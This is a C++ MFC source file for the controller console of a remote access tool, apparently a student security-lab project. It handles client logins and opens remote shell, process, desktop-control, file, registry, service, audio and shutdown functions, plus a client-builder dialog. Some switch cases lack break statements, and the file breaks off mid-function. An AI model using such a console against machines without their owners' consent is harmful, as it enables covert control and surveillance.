﻿
// ServerPojectDlg.cpp: 实现文件
//

#include "pch.h"
#include "framework.h"
#include "ServerPoject.h"
#include "ServerPojectDlg.h"
#include "afxdialogex.h"
#include "ServerManagerDlg.h"
#include "Common.h"
#include "Login.h"
#include "resource.h"
#include "InstantMessageDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框


#define UM_NOTIFY_ICON_DATA  WM_USER + 1    //随便定义
COLUMN_DATA __ClientInfoList[] =
{
	{ "IP",				205 },
	{ "区域",			205 },
	{ "计算机名/备注",	205 },
	{ "操作系统",		205 },
	{ "CPU",			206 },
	{ "摄像头",			206 },
	{ "PING",			206 }
};
COLUMN_DATA __ServerInfoList[] =
{
	{ "信息类型",		420 },
	{ "时间",			420 },
	{ "信息内容",	    598 }
};
//静态全局变量  不能让当前的全局变量在其他的cpp文件中被使用
static UINT __Indicators[] =
{
	IDR_STATUSBAR_SERVER_STRING
};

CServerPojectDlg* __ServerProjectDlg = NULL;

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CServerPojectDlg 对话框



CServerPojectDlg::CServerPojectDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_SERVERPOJECT_DIALOG, pParent)
{
	m_ListenPort = 0;
	m_MaxConnections = 0;
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CServerPojectDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_CLIENT_INFORMATION_LIST, m_ClientInfoList);
	DDX_Control(pDX, IDC_SERVER_INFORMATION_LIST, m_ServerInfoList);     //控件变量与控件ID进行关联
}

BEGIN_MESSAGE_MAP(CServerPojectDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_TIMER()                  
	ON_COMMAND(ID_SET_LOCATION, &CServerPojectDlg::OnSetLocation)
	ON_COMMAND(ID_ADD_INFORMATION, &CServerPojectDlg::OnAddInformation)
	ON_COMMAND(ID_EXIT_PROGRAM, &CServerPojectDlg::OnExitProgram)
	ON_WM_CLOSE()
	ON_COMMAND(ID_CMD_MANAGER, &CServerPojectDlg::OnButtonCmdManager)
	ON_COMMAND(ID_PROCESS_MANAGER, &CServerPojectDlg::OnButtonProcessManager)
	ON_COMMAND(ID_WINDOW_MANAGER, &CServerPojectDlg::OnButtonWindowManager)
	ON_COMMAND(ID_REMOTE_CONTROL, &CServerPojectDlg::OnButtonRemoteControl)
	ON_COMMAND(ID_FILE_MANAGER, &CServerPojectDlg::OnButtonFileManager)
	ON_COMMAND(ID_AUDIO_MANAGER, &CServerPojectDlg::OnButtonAudioManager)
	ON_COMMAND(ID_CLEAN_MANAGER, &CServerPojectDlg::OnButtonCleanManager)
	ON_COMMAND(ID_VIDEO_MANAGER, &CServerPojectDlg::OnButtonVideoManager)
	ON_COMMAND(ID_SERVICE_MANAGER, &CServerPojectDlg::OnButtonServiceManager)
	ON_COMMAND(ID_REGISTER_MANAGER, &CServerPojectDlg::OnButtonRegisterManager)
	ON_COMMAND(ID_SERVER_MANAGER, &CServerPojectDlg::OnButtonServerManager)
	ON_COMMAND(ID_CLIENT_MANAGER, &CServerPojectDlg::OnButtonClientManager)
	ON_COMMAND(ID_SERVER_ABOUT, &CServerPojectDlg::OnButtonServerAbout)
	ON_MESSAGE(UM_NOTIFY_ICON_DATA, (LRESULT(__thiscall CWnd::*)(WPARAM, LPARAM))OnNotifyIconData)
	ON_COMMAND(ID_SHOW_MAIN_DIALOG, &CServerPojectDlg::OnShowMainDialog)
	ON_COMMAND(ID_HIDE_MAIN_DIALOG, &CServerPojectDlg::OnHideMainDialog)

	ON_MESSAGE(UM_CLIENT_LOGIN, OnClientLogin)
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_CLIENT_INFORMATION_LIST, &CServerPojectDlg::OnNMRClickClientInformationList)
	ON_COMMAND(ID_DELETE_CLIENT_INFO, &CServerPojectDlg::OnDeleteClientInfo)
	ON_COMMAND(ID_INSTANT_MESSAGING, &CServerPojectDlg::OnInstantMessaging)
	ON_COMMAND(ID_REMOTE_SHUTDOWN, &CServerPojectDlg::OnRemoteShutdown)

	ON_MESSAGE(UM_OPEN_REMOTE_MESSAGE_DIALOG, OnOpenInstantMessageDialog)
	ON_MESSAGE(UM_OPEN_CMD_MANAGER_DIALOG, OnOpenCmdManagerDialog)
	ON_MESSAGE(UM_OPEN_PROCESS_MANAGER_DIALOG, OnOpenProcessManagerDialog)
	ON_MESSAGE(UM_OPEN_WINDOW_MANAGER_DIALOG, OnOpenWindowManagerDialog)
	ON_MESSAGE(UM_OPEN_REMOTE_CONTROLLER_DIALOG, OnOpenRemoteControllerDialog)
	ON_MESSAGE(UM_OPEN_FILE_MANAGER_DIALOG, OnOpenFileManagerDialog)
	ON_MESSAGE(UM_OPEN_REGISTER_MANAGER_DIALOG, OnOpenRegisterManagerDialog)
	ON_MESSAGE(UM_OPEN_SERVICE_MANAGER_DIALOG, OnOpenServiceManagerDialog)	//服务管理
	ON_MESSAGE(UM_OPEN_AUDIO_MANAGER_DIALOG, OnOpenAudioManagerDialog)		//音频管理
END_MESSAGE_MAP()


// CServerPojectDlg 消息处理程序

BOOL CServerPojectDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();
	// 将“关于...”菜单项添加到系统菜单中。
	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码

	__ServerProjectDlg = this;       //构造函数中也可以



	InitializeTrueColorToolBar();    	
	InitializeSolidMenu();
	InitializeListCtrl();
	InitializeNotifyIconData();
	InitializeStatusBar();     
	SetTimer(0, 1000, NULL);//设置定时器，每秒触发一次	     
	GetLocalTime();



	m_ConfigFile.GetIntFromCongfigFile(_T("Settings"), _T("ListenPort"),    (int*)&m_ListenPort);
	m_ConfigFile.GetIntFromCongfigFile(_T("Settings"), _T("MaxConnections"),(int*)&m_MaxConnections);


	StartServer();    



	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}
void CServerPojectDlg::StartServer()
{

	//启动通信
	m_IocpServer = new CIocpServer;    //动态申请我们的类对象

	if (m_IocpServer == NULL)
	{
		return;
	}
	if (m_IocpServer->ServerRun(m_ListenPort,WndCallback) == TRUE)   //设置Dlg当前获取到 ushort 65536  监听端口
	{

	}


	//显示服务端信息
	CString v1;
	v1.Format(_T("监听端口: %d 最大连接数:%d"), m_ListenPort,m_MaxConnections);   
	ShowMainDlgInfo(TRUE, v1);
}
void CServerPojectDlg::ShowMainDlgInfo(BOOL IsOk, CString& Message)
{
	//定义一个CTime对象
	CTime Object = CTime::GetCurrentTime();        //强制调用CTime类中该函数    
	CString v1;
	CString v2 = Object.Format("%H:%M:%S");        //将获得的时间以该格式进行字符串格式化'

	if (IsOk)
	{
		v1 = _T("执行成功");
	}
	else
	{
		v1 = _T("执行失败");
	}

	m_ServerInfoList.InsertItem(0, v1);    //向控件中设置数据
	m_ServerInfoList.SetItemText(0, 1, v2);
	m_ServerInfoList.SetItemText(0, 2, Message);


	if (Message.Find("上线") > 0)         //处理上线还是下线消息
	{
		m_ConnectionCount++;
	}
	else if (Message.Find("下线") > 0)
	{
		m_ConnectionCount--;
	}
	else if (Message.Find("断开") > 0)
	{
		m_ConnectionCount--;
	}
	CString v3;
	m_ConnectionCount = (m_ConnectionCount <= 0 ? 0 : m_ConnectionCount);         //防止iCount 有-1的情况
	v3.Format("有%d个主机在线", m_ConnectionCount);
	m_StatusBar.SetPaneText(0, v3);   //在状态条上显示文字
}
VOID CALLBACK CServerPojectDlg::WndCallback(PCONTEXT_OBJECT ContextObject)  //静态成员函数
{
	//IocpSever类中与窗口交互的函数   
	//不能够直接调用普通的类成员函数 通过传参this窗口类句柄 

	WndHandleIo(ContextObject);   //学习点

}
VOID CServerPojectDlg::WndHandleIo(CONTEXT_OBJECT* ContextObject)   //静态成员 
{
	if (ContextObject == NULL)
	{
		return;
	}
	if (ContextObject->DlgIdentity > 0) {
		switch (ContextObject->DlgIdentity)
		{
		case CMD_MANAGER_DIALOG:
		{
			CCmdManagerDlg* Dialog = (CCmdManagerDlg*)ContextObject->DlgHandle;
			Dialog->OnReceiveComplete();
			
			break;
		}
		case PROCESS_MANAGER_DIALOG:
		{
			CProcessManager* Dialg = (CProcessManager*)ContextObject->DlgHandle;
			Dialg->OnReceiveComplete();
		}

		case REMOTE_CONTROLLER_DIALOG:
		{
			CRemoteControllerDlg* Dialog = (CRemoteControllerDlg*)ContextObject->DlgHandle;
			Dialog->OnReceiveComplete();

			break;
		}
		case WINDOW_MANAGER_DIALOG:
		{
			CWindowManagerDlg* Dialg = (CWindowManagerDlg*)ContextObject->DlgHandle;
			Dialg->OnReceiveComplete();
		}
		case FILE_MANAGER_DIALOG:
		{
			CFileManagerDlg* Dialog = (CFileManagerDlg*)ContextObject->DlgHandle;
			Dialog->OnReceiveComplete();

			break;
		}
		case REGISTER_MANAGER_DIALOG:
		{
			CRegisterManagerDlg* Dialog = (CRegisterManagerDlg*)ContextObject->DlgHandle;
			Dialog->OnReceiveComplete();
			break;
		}
		//服务管理
		case SERVICE_MANAGER_DIALOG:
		{
			CServiceManagerDlg* Dialog = (CServiceManagerDlg*)ContextObject->DlgHandle;
			Dialog->OnReceiveComplete();
			break;
		}
		case AUDIO_MANAGER_DIALOG:
		{
			CAudioManagerDlg* Dialog = (CAudioManagerDlg*)ContextObject->DlgHandle;
			Dialog->OnReceiveComplete();

			break;
		}
		}
		return;
	}

	switch (ContextObject->m_ReceivedDecompressedBufferData.GetArray(0)[0])   //[13][]
	{
	case CLIENT_LOGIN:   //用户登录请求
	{

		//调用类窗口中的非静态成员函数
		//消息函数  来实现窗口中的函数调用
		__ServerProjectDlg->PostMessageA(UM_CLIENT_LOGIN,
			NULL, (LPARAM)ContextObject);   //使用自定义消息

		break;
	}
	case CLIENT_GET_OUT_REPLY:
	{
		CancelIo((HANDLE)ContextObject->ClientSocket);  //回收在当前对象上的异步请求
		closesocket(ContextObject->ClientSocket);
		ContextObject->ClientSocket = NULL;
		Sleep(10);
		break;
	}

	case CLIENT_SHUT_DOWN_REPLY:		//远程关机
	{

		CancelIo((HANDLE)ContextObject->ClientSocket);  //回收在当前对象上的异步请求
		closesocket(ContextObject->ClientSocket);		//关闭通信套接字
		ContextObject->ClientSocket = NULL;
		Sleep(10);

		break;
	}

	case CLIENT_REMOTE_MESSAGE_REPLY:
	{

		__ServerProjectDlg->PostMessage(UM_OPEN_REMOTE_MESSAGE_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}

	case CLIENT_CMD_MANAGER_REPLY:
	{

		__ServerProjectDlg->PostMessage(UM_OPEN_CMD_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case CLIENT_PROCESS_MANAGER_REPLY:
	{
		__ServerProjectDlg->PostMessage(UM_OPEN_PROCESS_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case CLIENT_WINDOW_MANAGER_REPLY:
	{
		__ServerProjectDlg->PostMessage(UM_OPEN_WINDOW_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;

	}
	case CLIENT_REMOTE_CONTROLLER_REPLY:
	{

		//接到客户端发过来的位图信息
		__ServerProjectDlg->PostMessage(UM_OPEN_REMOTE_CONTROLLER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	//文件管理
	case CLIENT_FILE_MANAGER_REPLY:
	{
		//接到客户端发过来的位图信息
		__ServerProjectDlg->PostMessage(UM_OPEN_FILE_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	//注册表管理
	case CLIENT_REGISTER_MANAGER_REPLY:
	{
		//接到客户端发过来的位图信息
		__ServerProjectDlg->PostMessage(UM_OPEN_REGISTER_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	//服务管理
	case CLIENT_SERVICE_MANAGER_REPLY:
	{
		__ServerProjectDlg->PostMessage(UM_OPEN_SERVICE_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	//音频管理
	case CLIENT_AUDIO_MANAGER_REPLY:
	{
		//接到客户端发过来的位图信息
		__ServerProjectDlg->PostMessage(UM_OPEN_AUDIO_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	}
}
//即时消息管理界面
LRESULT CServerPojectDlg::OnOpenInstantMessageDialog(WPARAM ParameterData1, LPARAM ParameterData2)
{
	//创建一个远程消息对话框
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)ParameterData2;

	//非阻塞对话框
	CInstantMessageDlg* Dialog = new CInstantMessageDlg(this, m_IocpServer, ContextObject);
	// 设置父窗口为桌面
	Dialog->Create(IDD_INSTANT_MESSAGE_DIALOG, GetDesktopWindow());    //创建非阻塞的Dlg
	Dialog->ShowWindow(SW_SHOW);

	return 0;
}
//CMD终端管理界面
LRESULT CServerPojectDlg::OnOpenCmdManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2)
{
	//创建一个远程消息对话框
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)ParameterData2;
	//非阻塞对话框
	//阻塞对话框

	CCmdManagerDlg* Dialog = new CCmdManagerDlg(this, m_IocpServer, ContextObject);
	// 设置父窗口为卓面
	Dialog->Create(IDD_CMD_MANAGER_DIALOG, GetDesktopWindow());    //创建非阻塞的Dlg
	Dialog->ShowWindow(SW_SHOW);

	if (ContextObject != NULL)
	{
		ContextObject->DlgIdentity = CMD_MANAGER_DIALOG;
		ContextObject->DlgHandle = Dialog;
	}

	return 0;
}
//进程管理界面
LRESULT CServerPojectDlg::OnOpenProcessManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2)
{
	//创建一个远程消息对话框
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)ParameterData2;

	//非阻塞对话框
	CProcessManager* Dialog = new CProcessManager(this, m_IocpServer, ContextObject);
	// 设置父窗口为卓面
	Dialog->Create(IDD_PROCESS_MANAGER_DIALOG, GetDesktopWindow());    //创建非阻塞的Dlg
	Dialog->ShowWindow(SW_SHOW);

	if (ContextObject != NULL)
	{
		ContextObject->DlgIdentity = PROCESS_MANAGER_DIALOG;
		ContextObject->DlgHandle = Dialog;
	} 
	return 0;
}
//窗口管理界面
LRESULT CServerPojectDlg::OnOpenWindowManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2)
{
	//创建一个远程消息对话框
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)ParameterData2;

	//非阻塞对话框
	CWindowManagerDlg* Dialog = new CWindowManagerDlg(this, m_IocpServer, ContextObject);
	// 设置父窗口为卓面
	Dialog->Create(IDD_WINDOW_MANAGER_DIALOG, GetDesktopWindow());    //创建非阻塞的Dlg
	Dialog->ShowWindow(SW_SHOW);



	if (ContextObject != NULL)
	{
		ContextObject->DlgIdentity = WINDOW_MANAGER_DIALOG;
		ContextObject->DlgHandle = Dialog;
	}

	return 0;
}
//远程控制管理界面
LRESULT CServerPojectDlg::OnOpenRemoteControllerDialog(WPARAM ParameterData1, LPARAM ParameterData2)
{
	//创建一个远程消息对话框
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)ParameterData2;
	//非阻塞对话框
	CRemoteControllerDlg* Dialog = new CRemoteControllerDlg(this, m_IocpServer, ContextObject);
	// 设置父窗口为卓面
	Dialog->Create(IDD_REMOTE_CONTROLLER_DIALOG, GetDesktopWindow());    //创建非阻塞的Dlg
	Dialog->ShowWindow(SW_SHOW);



	if (ContextObject != NULL)
	{
		ContextObject->DlgIdentity = REMOTE_CONTROLLER_DIALOG;
		ContextObject->DlgHandle = Dialog;
	}

	return 0;
}
LRESULT CServerPojectDlg::OnOpenFileManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2)
{
	//创建一个远程消息对话框
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)ParameterData2;

	//非阻塞对话框
	CFileManagerDlg* Dialog = new CFileManagerDlg(this, m_IocpServer, ContextObject);
	// 设置父窗口为卓面
	Dialog->Create(IDD_FILE_MANAGER_DIALOG, GetDesktopWindow());    //创建非阻塞的Dlg
	Dialog->ShowWindow(SW_SHOW);


	if (ContextObject != NULL)
	{
		ContextObject->DlgIdentity = FILE_MANAGER_DIALOG;
		ContextObject->DlgHandle = Dialog;
	}

	return 0;
}

LRESULT CServerPojectDlg::OnOpenRegisterManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2)
{
	//创建一个远程消息对话框
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)ParameterData2;
	//非阻塞对话框
	CRegisterManagerDlg* Dialog = new CRegisterManagerDlg(this, m_IocpServer, ContextObject);
	// 设置父窗口为卓面
	Dialog->Create(IDD_REGISTER_MANAGER_DIALOG, GetDesktopWindow());    //创建非阻塞的Dlg
	Dialog->ShowWindow(SW_SHOW);

	if (ContextObject != NULL)
	{
		ContextObject->DlgIdentity = REGISTER_MANAGER_DIALOG;
		ContextObject->DlgHandle = Dialog;
	}

	return 0;
}

LRESULT CServerPojectDlg::OnOpenServiceManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2)
{
	//创建一个远程消息对话框
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)ParameterData2;
	//非阻塞对话框
	CServiceManagerDlg* Dialog = new CServiceManagerDlg(this, m_IocpServer, ContextObject);
	// 设置父窗口为卓面
	Dialog->Create(IDD_SERVICE_MANAGER_DIALOG, GetDesktopWindow());    //创建非阻塞的Dlg
	Dialog->ShowWindow(SW_SHOW);

	if (ContextObject != NULL)
	{
		ContextObject->DlgIdentity = SERVICE_MANAGER_DIALOG;
		ContextObject->DlgHandle = Dialog;
	}

	return 0;
}

LRESULT CServerPojectDlg::OnOpenAudioManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2)
{
	//创建一个远程消息对话框
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)ParameterData2;
	//非阻塞对话框
	CAudioManagerDlg* Dialog = new CAudioManagerDlg(this, m_IocpServer, ContextObject);
	// 设置父窗口为卓面
	Dialog->Create(IDD_AUDIO_MANAGER_DIALOG, GetDesktopWindow());    //创建非阻塞的Dlg
	Dialog->ShowWindow(SW_SHOW);

	if (ContextObject != NULL)
	{
		ContextObject->DlgIdentity = AUDIO_MANAGER_DIALOG;
		ContextObject->DlgHandle = Dialog;
	}

	return 0;
}
void CServerPojectDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CServerPojectDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CServerPojectDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CServerPojectDlg::InitializeListCtrl()
{

	//客户端界面设置
	for (int i = 0; i < sizeof(__ClientInfoList) / sizeof(COLUMN_DATA); i++)
	{
		m_ClientInfoList.InsertColumn(i, __ClientInfoList[i].TitleData,LVCFMT_CENTER, __ClientInfoList[i].TitleWidth);
	}
	m_ClientInfoList.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	//服务端界面设置：
	for (int i = 0; i < sizeof(__ServerInfoList) / sizeof(COLUMN_DATA); i++)
	{
		m_ServerInfoList.InsertColumn(i, __ServerInfoList[i].TitleData, LVCFMT_CENTER,
			__ServerInfoList[i].TitleWidth);
	}
	m_ServerInfoList.SetExtendedStyle(LVS_EX_FULLROWSELECT);

}


void CServerPojectDlg::OnTimer(UINT_PTR nIDEvent)    //第几个钟表
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值

	if (nIDEvent == 0)
	{
		GetLocalTime();
	}
	CDialogEx::OnTimer(nIDEvent);
}

void CServerPojectDlg::GetLocalTime()
{
	auto  Object = time(NULL);   //自动变量(Time的对象)   
	tm v1;
	char  v2[MAX_PATH];
	localtime_s(&v1, &Object);
	strftime(v2, _countof(v2), "%Y-%m-%d %H:%M:%S", &v1);   //获得的时间v1以该格式进行字符串格式化

	SetWindowText(v2);   //设置到主窗口的标题栏上
}

void CServerPojectDlg::OnExitProgram()
{
	// TODO: 在此添加命令处理程序代码
	
	//释放当前程序中的资源对象
	//关闭时钟

	SendMessage(WM_CLOSE);    //消息函数的调用方法
}
void CServerPojectDlg::OnClose()   //消息函数实现
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	//MessageBox("OnClose");


	if (m_IocpServer != NULL)
	{
		delete m_IocpServer;
		m_IocpServer = NULL;
	}

	KillTimer(0);   //0时钟ID
	Shell_NotifyIcon(NIM_DELETE, &m_NotifyIconData);
	

    

	
	CDialogEx::OnClose();
}

void CServerPojectDlg::OnSetLocation()
{
	// TODO: 在此添加命令处理程序代码
}
void CServerPojectDlg::OnAddInformation()
{
	// TODO: 在此添加命令处理程序代码

	//测试
	//int i = m_ServerInfoList.InsertItem(m_ServerInfoList.GetItemCount(), "张飞");  //把张飞插入到第几排
	//m_ServerInfoList.SetItemText(i, 1, "23");
	//m_ServerInfoList.SetItemText(i, 2, "车骑将军");
	//m_ServerInfoList.SetItemText(i, 3, "蜀");
}

void CServerPojectDlg::InitializeSolidMenu()
{

	HMENU  Object;    //定义一个菜单对象    将数据型数据转换成字符型数据
	Object = LoadMenu(NULL, MAKEINTRESOURCE(IDR_SERVER_DIALOG_MAIN_MENU));        //对象载入菜单资源
	::SetMenu(this->GetSafeHwnd(), Object);                                       //将带有资源的菜单对象设置到主Dlg句柄上
	::DrawMenuBar(this->GetSafeHwnd());                  //刷新显示

}
void CServerPojectDlg::InitializeTrueColorToolBar()
{
	//
	if (!m_TrueColorToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC))  //创建一个工具条  加载资源
	{

		return;
	}

	if (!m_TrueColorToolBar.LoadToolBar(IDR_SERVER_DIALOG_MAIN_TOOLBAR))
	{
		return;
	}

	m_TrueColorToolBar.LoadTrueColorToolBar
	(
		48,    //加载真彩工具条
		IDB_SERVER_DIALOG_MAIN_BITMAP,
		IDB_SERVER_DIALOG_MAIN_BITMAP,
		IDB_SERVER_DIALOG_MAIN_BITMAP
	);  //和我们的位图资源相关联

	RECT v1, v2;   //设置矩形对象
	GetWindowRect(&v2);   //得到整个窗口的大小
	v1.left = 0;
	v1.top = 0;
	v1.bottom = 80;
	v1.right = v2.right - v2.left + 10;
	m_TrueColorToolBar.MoveWindow(&v1, TRUE);    //将真彩Bar设置到对象v1范围内


	m_TrueColorToolBar.SetButtonText(0, "终端管理");     //在位图的下面添加文件
	m_TrueColorToolBar.SetButtonText(1, "进程管理");
	m_TrueColorToolBar.SetButtonText(2, "窗口管理");
	m_TrueColorToolBar.SetButtonText(3, "桌面管理");
	m_TrueColorToolBar.SetButtonText(4, "文件管理");
	m_TrueColorToolBar.SetButtonText(5, "语音管理");
	m_TrueColorToolBar.SetButtonText(6, "系统清理");
	m_TrueColorToolBar.SetButtonText(7, "视频管理");
	m_TrueColorToolBar.SetButtonText(8, "服务管理");
	m_TrueColorToolBar.SetButtonText(9, "注册表管理");
	m_TrueColorToolBar.SetButtonText(10, "服务端设置");
	m_TrueColorToolBar.SetButtonText(11, "客户端设置");
	m_TrueColorToolBar.SetButtonText(12, "帮助");
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);  //显示
}
void CServerPojectDlg::InitializeNotifyIconData()
{
	//定义托盘类成员变量
	m_NotifyIconData.cbSize = sizeof(NOTIFYICONDATA);
	m_NotifyIconData.hWnd = m_hWnd;
	m_NotifyIconData.uID = IDR_MAINFRAME;
	m_NotifyIconData.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;  //气泡提示
	m_NotifyIconData.uCallbackMessage = UM_NOTIFY_ICON_DATA;   //自定义消息  与该消息要关联消息处理函数       
	m_NotifyIconData.hIcon = m_hIcon;
	CString v1 = "长安大学安全实验室";
	lstrcpyn(m_NotifyIconData.szTip, v1, sizeof(m_NotifyIconData.szTip) / sizeof(m_NotifyIconData.szTip[0]));
	Shell_NotifyIcon(NIM_ADD, &m_NotifyIconData);         //显示托盘
}
VOID CServerPojectDlg::InitializeStatusBar()
{
	//成员函数  
	//消息函数(声明  Mapping  实现)  Static函数(声明 实现)  普通函数(声明 实现 自定义消息函数)
	//MFC 成员变量  
	//

	if (!m_StatusBar.Create(this) ||
		!m_StatusBar.SetIndicators(__Indicators,
			sizeof(__Indicators) / sizeof(UINT)))                    //创建状态条并设置字符资源的ID
	{
		return;
	}
	CRect v1;    //矩形类
	GetWindowRect(&v1); //Top Left Bottom Rigth   
	v1.bottom += 1;     //没有任何意义  触发OnSize立即执行
	MoveWindow(v1);
}


VOID CServerPojectDlg::OnButtonCmdManager()
{
	BYTE	IsToken = CLIENT_CMD_MANAGER_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE)); 
}
VOID CServerPojectDlg::OnButtonProcessManager()
{
	BYTE	IsToken = CLIENT_PROCESS_MANAGER_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));

}
VOID CServerPojectDlg::OnButtonWindowManager()
{
	BYTE	IsToken = CLIENT_WINDOW_MANAGER_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}

VOID CServerPojectDlg::OnButtonRemoteControl()
{
	BYTE	IsToken = CLIENT_REMOTE_CONTROLLER_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}

VOID CServerPojectDlg::OnButtonFileManager()
{
	BYTE	IsToken = CLIENT_FILE_MANAGER_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
VOID CServerPojectDlg::OnButtonAudioManager()
{
	BYTE	IsToken = CLIENT_AUDIO_MANAGER_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
VOID CServerPojectDlg::OnButtonCleanManager()
{

	//MessageBox("OnButtonCleanManager", "OnButtonCleanManager");
	return;
}
VOID CServerPojectDlg::OnButtonVideoManager()
{
	return;
}

VOID CServerPojectDlg::OnButtonServiceManager()
{
	// 判断是否有选中项 - 没有选中项，直接向自己投递消息。打开文件管理器s
	BYTE	IsToken = CLIENT_SERVICE_MANAGER_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
VOID CServerPojectDlg::OnButtonRegisterManager()
{
	BYTE	IsToken = CLIENT_REGISTER_MANAGER_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}

VOID CServerPojectDlg::OnButtonServerManager()
{
	CServerManagerDlg Object(this);    //构造类对象
	Object.DoModal();        //显示对话框
	return;
}
//客户端生成
VOID CServerPojectDlg::OnButtonClientManager()
{
	CCreateClientDlg Object;
	Object.DoModal();
	return;
}
VOID CServerPojectDlg::OnButtonServerAbout()
{

	//MessageBox("OnButtonServerAbout", "OnButtonServerAbout");
	return;
}
void CServerPojectDlg::OnNotifyIconData(WPARAM wParam, LPARAM lParam)
{
	switch ((UINT)lParam)   //判断动作
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONDBLCLK:
	{
		if (!IsWindowVisible())  //当前主对话框是否是显示状态
		{
			//窗口不显示
			ShowWindow(SW_SHOW);
		}
		else
		{
			ShowWindow(SW_HIDE);
		}
		break;
	}
